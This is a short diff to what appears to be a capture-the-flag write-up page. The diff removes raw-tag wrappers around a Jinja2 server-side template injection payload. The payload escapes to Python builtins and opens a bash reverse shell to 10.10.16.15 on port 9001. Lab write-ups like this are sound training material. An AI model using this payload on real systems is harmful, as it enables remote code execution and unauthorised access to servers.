@@ -363,9 +363,7 @@ Since it's using jinja, we can jump to,&#x20;
 Payload used:
 
 ```python
-{% raw %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'sh -i >& /dev/tcp/10.10.16.15/9001 0>&1'").read()}}{%endif%}{% endfor %}
-{% endraw %}
 ```
 
 <figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
